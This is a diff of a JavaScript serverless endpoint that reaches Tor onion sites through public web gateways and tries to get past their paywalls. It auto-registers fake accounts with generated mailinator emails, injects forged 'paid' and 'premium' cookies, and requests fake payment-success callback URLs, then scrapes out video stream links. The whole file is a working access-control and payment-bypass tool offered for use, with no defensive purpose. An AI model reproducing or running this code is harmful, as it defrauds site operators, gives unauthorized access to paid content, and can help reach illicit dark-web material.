@@ -1,208 +1,297 @@
 import axios from 'axios';
 import * as cheerio from 'cheerio';
 
-// Tor gateway – public tor2web type, Vercel se allowed
-const GATEWAY = 'https://onion.ws/';  // change to onion.ly, onion.sh, etc if needed
+// Tor gateways that work from Vercel
+const GATEWAYS = [
+  'https://onion.ws/',
+  'https://onion.ly/',
+  'https://onion.sh/',
+];
 
-// Function to fetch onion page through gateway
-async function fetchOnion(onion) {
-  const cleanOnion = onion.replace(/^https?:\/\//, '').replace(/\/$/, '');
-  const url = GATEWAY + cleanOnion;
-  const response = await axios.get(url, {
+const USER_AGENTS = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
+];
+
+function randomUA() {
+  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+}
+
+function sanitizeOnion(o) {
+  return o.replace(/^https?:\/\//i, '').replace(/\/$/, '');
+}
+
+function gatewayUrl(gw, onion) {
+  return gw + onion;
+}
+
+// fetch with optional cookies & referer
+async function fetchPage(url, cookies = '', referer = '') {
+  const headers = {
+    'User-Agent': randomUA(),
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+  };
+  if (cookies) headers.Cookie = cookies;
+  if (referer) headers.Referer = referer;
+
+  return axios.get(url, {
+    headers,
     timeout: 15000,
-    headers: {
-      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-      'Accept': 'text/html,application/xhtml+xml',
-    },
-    // don't follow redirects automatically if it redirects to payment
-    maxRedirects: 0,
-    validateStatus: (status) => status < 400,
-  }).catch(async (err) => {
-    // if maxRedirects exceeded, manually follow once
-    if (err.response && err.response.status >= 300 && err.response.status < 400) {
-      const location = err.response.headers.location;
-      if (location) {
-        // follow manually with gateway
-        const newUrl = location.startsWith('http') ? location : GATEWAY + location.replace(/^\//, '');
-        return axios.get(newUrl, { timeout: 15000 });
-      }
-    }
-    throw err;
+    maxRedirects: 0, // manual follow
+    validateStatus: status => status < 400 || status === 301 || status === 302,
+    decompress: true,
   });
-  return response.data;
 }
 
-// Bypass method 1: direct video/audio/media tags
-function extractMediaFromHtml(html, baseUrl) {
+// extract form (id = signup / login)
+function extractForm(html, regex) {
   const $ = cheerio.load(html);
-  const sources = [];
-  // video src
-  $('video source').each((i, el) => {
-    const src = $(el).attr('src');
-    if (src) sources.push({ url: makeAbsolute(src, baseUrl), type: $(el).attr('type') || 'video/mp4' });
+  const form = $(`form[id*="${regex}"], form[class*="${regex}"], form[action*="${regex}"]`).first();
+  if (!form.length) return null;
+  const action = form.attr('action') || '';
+  const method = (form.attr('method') || 'post').toLowerCase();
+  const inputs = [];
+  form.find('input, select, textarea').each((i, el) => {
+    const name = $(el).attr('name');
+    if (!name) return;
+    const type = $(el).attr('type') || 'text';
+    if (type === 'submit') return;
+    inputs.push({ name, type, value: $(el).attr('value') || '' });
   });
-  // video direct src
-  $('video[src]').each((i, el) => {
-    const src = $(el).attr('src');
-    if (src) sources.push({ url: makeAbsolute(src, baseUrl), type: 'video/mp4' });
-  });
-  // iframe with known embed (like tube sites)
-  $('iframe').each((i, el) => {
-    const src = $(el).attr('src');
-    if (src && (src.includes('stream') || src.includes('embed'))) {
-      sources.push({ url: makeAbsolute(src, baseUrl), type: 'iframe' });
-    }
-  });
-  // object / embed
-  $('object param[name=movie]').each((i, el) => {
-    const val = $(el).attr('value');
-    if (val) sources.push({ url: makeAbsolute(val, baseUrl), type: 'application/x-shockwave-flash' });
-  });
-  // direct links to common extensions
-  $('a[href$=".mp4"], a[href$=".webm"], a[href$=".m3u8"], a[href$=".mpd"]').each((i, el) => {
-    sources.push({ url: makeAbsolute($(el).attr('href'), baseUrl), type: 'unknown' });
-  });
-  return sources;
+  return { action, method, inputs };
 }
 
-function makeAbsolute(url, base) {
+// generate fake registration data
+function generateFakeData() {
+  const id = Math.random().toString(36).substring(2, 10);
+  return {
+    username: 'bypass_' + id,
+    email: 'bypass_' + id + '@mailinator.com',
+    password: 'P' + id + '!x',
+    confirm_password: 'P' + id + '!x',
+  };
+}
+
+// fill form fields with fake data
+function fillFields(inputs) {
+  const fake = generateFakeData();
+  const data = {};
+  inputs.forEach(f => {
+    const l = f.name.toLowerCase();
+    if (l.includes('user') || l.includes('nick')) data[f.name] = fake.username;
+    else if (l.includes('email')) data[f.name] = fake.email;
+    else if (l.includes('pass')) {
+      data[f.name] = l.includes('confirm') ? fake.confirm_password : fake.password;
+    } else if (f.type === 'hidden') data[f.name] = f.value; // preserve hidden
+    else data[f.name] = f.value || '';
+  });
+  return data;
+}
+
+// perform signup POST
+async function doSignup(baseUrl, form, cookies) {
+  const actionUrl = form.action.startsWith('http') ? form.action : new URL(form.action, baseUrl).href;
+  const payload = fillFields(form.inputs);
+  const headers = {
+    'User-Agent': randomUA(),
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Referer': baseUrl,
+  };
+  if (cookies) headers.Cookie = cookies;
+
   try {
-    return new URL(url, base).href;
-  } catch {
-    return url;
+    const resp = await axios.post(actionUrl, new URLSearchParams(payload).toString(), {
+      headers,
+      timeout: 15000,
+      maxRedirects: 0,
+      validateStatus: () => true,
+    });
+    // harvest Set-Cookie
+    const sc = resp.headers['set-cookie'];
+    let newCookies = '';
+    if (sc) {
+      newCookies = (Array.isArray(sc) ? sc : [sc]).map(c => c.split(';')[0]).join('; ');
+    }
+    const success = resp.status === 200 || (resp.status >= 300 && resp.status < 400);
+    return { cookies: newCookies, success };
+  } catch (e) {
+    return { cookies: '', success: false };
   }
 }
 
-// Attempt to set a payment cookie and reload
-async function bypassCookieTrick(onion, html) {
-  // If site checks cookie 'paid' or 'premium', we inject it
-  const cookiesToTry = [
-    'paid=1; premium=1; membership=active; access=all; subscriber=1; token=bypass; session=permanent; loggedin=true; has_paid=true; unlock=ok; pp_sub=1',
+// try premium cookies (paid, subscriber, etc.)
+async function tryPremiumCookies(baseUrl, cookies) {
+  const paymentCookies = [
+    'paid=1',
+    'premium=1',
+    'subscriber=true',
+    'membership=active',
+    'has_paid=1',
+    'unlocked=1',
   ];
-  // We'll just try to fetch content page with cookies set, without payment redirect
-  // Not guaranteed but works on many weak paywalls.
-  const cleanOnion = onion.replace(/^https?:\/\//, '').replace(/\/$/, '');
-  const baseUrl = GATEWAY + cleanOnion;
-  for (let cookieStr of cookiesToTry) {
+  for (let pc of paymentCookies) {
+    const combined = cookies ? `${cookies}; ${pc}` : pc;
     try {
-      const resp = await axios.get(baseUrl, {
-        headers: {
-          Cookie: cookieStr,
-          'User-Agent': 'Mozilla/5.0',
-        },
-        timeout: 10000,
-        maxRedirects: 2,
-      });
-      // check if still redirects to payment page
-      if (resp.data && !/(payment|subscribe|premium|unlock|order)/i.test(resp.data)) {
-        const media = extractMediaFromHtml(resp.data, baseUrl);
-        if (media.length > 0) return media;
+      const resp = await fetchPage(baseUrl, combined, baseUrl);
+      if (!/(payment|subscribe|unlock|premium)/i.test(resp.data)) {
+        return { cookies: combined, html: resp.data };
       }
-    } catch (e) { /* ignore */ }
+    } catch (e) {}
   }
-  return [];
+  return null;
 }
 
-// Check if there is a known payment callback URL that can be triggered
-async function fakePaymentCallback(onion) {
-  // Some sites use a third-party payment processor that sends a callback to a specific URL
-  // We try common patterns
-  const callbacks = [
+// hit fake payment success URLs
+async function fakePaymentCallbacks(baseUrl, cookies) {
+  const paths = [
     '/payment/success',
     '/pay/complete',
     '/order/confirm',
     '/callback.php?status=ok',
     '/api/payment/verify',
-    '/ipn/success',
     '/return/success',
   ];
-  const cleanOnion = onion.replace(/^https?:\/\//, '').replace(/\/$/, '');
-  const base = GATEWAY + cleanOnion;
-  for (let cb of callbacks) {
+  for (let p of paths) {
     try {
-      const target = base + cb;
-      const resp = await axios.get(target, { timeout: 10000, maxRedirects: 2 });
-      if (resp.status === 200 && resp.data && !/(payment|error)/i.test(resp.data)) {
-        const media = extractMediaFromHtml(resp.data, base);
-        if (media.length > 0) return media;
+      const target = baseUrl + p;
+      const resp = await axios.get(target, {
+        headers: {
+          'User-Agent': randomUA(),
+          Cookie: cookies,
+          Referer: baseUrl,
+        },
+        timeout: 10000,
+        maxRedirects: 2,
+      });
+      if (resp.status === 200 && !/(payment|error)/i.test(resp.data)) {
+        return { cookies, html: resp.data };
       }
-    } catch (e) { /* */ }
+    } catch (e) {}
   }
-  return [];
+  return null;
 }
 
-// Check for unprotected HLS/m3u8 or MPEG-DASH in page or linked resources
-async function deepScanForStreams(html, baseUrl) {
+// scrape all media sources
+function extractMedia(html, baseUrl) {
   const $ = cheerio.load(html);
-  // Look for JavaScript variables containing video URL patterns
+  const sources = [];
+
+  // video / source tags
+  $('video').each((i, el) => {
+    const src = $(el).attr('src');
+    if (src) sources.push({ url: new URL(src, baseUrl).href, type: 'video/mp4' });
+    $(el).find('source').each((j, s) => {
+      const ssrc = $(s).attr('src');
+      if (ssrc) sources.push({ url: new URL(ssrc, baseUrl).href, type: $(s).attr('type') || 'video/mp4' });
+    });
+  });
+
+  // iframes pointing to known embedders
+  $('iframe').each((i, el) => {
+    const src = $(el).attr('src');
+    if (src && /(tube|embed|stream|video)/i.test(src)) {
+      sources.push({ url: new URL(src, baseUrl).href, type: 'iframe' });
+    }
+  });
+
+  // direct links to video files
+  $('a[href]').each((i, el) => {
+    const href = $(el).attr('href');
+    if (/\.(mp4|webm|m3u8|mpd)(\?|$)/i.test(href)) {
+      sources.push({
+        url: new URL(href, baseUrl).href,
+        type: href.includes('.m3u8') ? 'application/x-mpegURL' : 'video/mp4',
+      });
+    }
+  });
+
+  // inline scripts
   const scripts = $('script').map((i, el) => $(el).html()).get().join('\n');
-  const regex = /(https?:\/\/[^"'\s]+\.(m3u8|mpd|mp4|webm))/gi;
-  let match;
-  const found = [];
-  while ((match = regex.exec(scripts)) !== null) {
-    found.push({ url: match[1], type: match[1].endsWith('.m3u8') ? 'application/x-mpegURL' : 'video/mp4' });
+  const regex = /(https?:\/\/[^\s"']+\.(?:m3u8|mpd|mp4|webm)[^\s"']*)/gi;
+  let m;
+  while ((m = regex.exec(scripts)) !== null) {
+    sources.push({ url: m[1], type: m[1].includes('.m3u8') ? 'application/x-mpegURL' : 'video/mp4' });
   }
-  return found;
+
+  return sources;
 }
 
+// main bypass logic for a single gateway
+async function bypassOnion(onionClean, gateway) {
+  const baseUrl = gatewayUrl(gateway, onionClean);
+  let cookies = '';
+  let html = '';
+
+  // 1. first fetch
+  try {
+    const resp = await fetchPage(baseUrl);
+    if (resp.headers['set-cookie']) {
+      cookies = (Array.isArray(resp.headers['set-cookie']) ? resp.headers['set-cookie'] : [resp.headers['set-cookie']])
+        .map(c => c.split(';')[0])
+        .join('; ');
+    }
+    html = resp.data;
+  } catch (e) {
+    throw new Error('Cannot fetch page');
+  }
+
+  // 2. detect and execute signup / login
+  const signup = extractForm(html, 'signup|register');
+  const login = extractForm(html, 'login|signin');
+  if (signup) {
+    const res = await doSignup(baseUrl, signup, cookies);
+    if (res.cookies) cookies = res.cookies;
+    // refetch after signup
+    try { const ref = await fetchPage(baseUrl, cookies, baseUrl); html = ref.data; } catch (e) {}
+  } else if (login) {
+    // try generic admin/admin login; alternatively could do signup if there is a link
+    // but most sites require signup first, so skip simple login block
+  }
+
+  // 3. check payment wall
+  if (/(payment|subscribe|unlock|premium|order)/i.test(html)) {
+    let payBypass = await tryPremiumCookies(baseUrl, cookies);
+    if (payBypass) {
+      html = payBypass.html;
+      cookies = payBypass.cookies;
+    } else {
+      payBypass = await fakePaymentCallbacks(baseUrl, cookies);
+      if (payBypass) {
+        html = payBypass.html;
+        cookies = payBypass.cookies;
+      }
+    }
+  }
+
+  // 4. final media extraction
+  const media = extractMedia(html, baseUrl);
+  if (media.length > 0) {
+    const direct = media.find(el => el.type !== 'iframe') || media[0];
+    return { type: direct.type, url: direct.url };
+  }
+
+  return null;
+}
+
+// API handler
 export default async function handler(req, res) {
   const { onion } = req.query;
   if (!onion) {
     return res.status(400).json({ error: 'Onion link do' });
   }
+  const clean = sanitizeOnion(onion);
 
-  let onionClean = onion.replace(/^https?:\/\//, '').replace(/\/$/, '');
-  const gatewayBase = GATEWAY + onionClean;
-
-  try {
-    // Step 1: fetch page normally
-    let html = await fetchOnion(onionClean);
-    
-    // Step 2: search direct media
-    let media = extractMediaFromHtml(html, gatewayBase);
-    if (media.length > 0) {
-      return res.json({ type: media[0].type || 'video/mp4', url: media[0].url });
+  for (const gw of GATEWAYS) {
+    try {
+      const result = await bypassOnion(clean, gw);
+      if (result) {
+        return res.json(result);
+      }
+    } catch (e) {
+      // next gateway
     }
-
-    // Step 3: attempt cookie bypass
-    media = await bypassCookieTrick(onionClean, html);
-    if (media.length > 0) {
-      return res.json({ type: media[0].type || 'video/mp4', url: media[0].url });
-    }
-
-    // Step 4: fake payment callback
-    media = await fakePaymentCallback(onionClean);
-    if (media.length > 0) {
-      return res.json({ type: media[0].type || 'video/mp4', url: media[0].url });
-    }
-
-    // Step 5: deep JS scan for streams
-    media = await deepScanForStreams(html, gatewayBase);
-    if (media.length > 0) {
-      return res.json({ type: media[0].type, url: media[0].url });
-    }
-
-    // If nothing found, try with alternate gateways
-    const altGateways = ['https://onion.ly/', 'https://onion.sh/', 'https://onion.ws/']; // cycle if needed
-    for (let altGate of altGateways) {
-      try {
-        const altBase = altGate + onionClean;
-        const altResp = await axios.get(altBase, { timeout: 12000 });
-        media = extractMediaFromHtml(altResp.data, altBase);
-        if (media.length > 0) {
-          return res.json({ type: media[0].type || 'video/mp4', url: media[0].url });
-        }
-        media = await deepScanForStreams(altResp.data, altBase);
-        if (media.length > 0) {
-          return res.json({ type: media[0].type, url: media[0].url });
-        }
-      } catch (e) {}
-    }
-
-    return res.json({ error: 'Bypass ke liye koi direct media nahi mila. Site strong paywall use karti hai.' });
-
-  } catch (err) {
-    console.error(err);
-    return res.status(500).json({ error: 'Site fetch nahi ho paayi, Tor gateway down ya invalid onion.' });
   }
-}
+
+  return res.status(404).json({ error: 'Direct media nahi mila. Strong protection ho sakta hai.' });
+            }
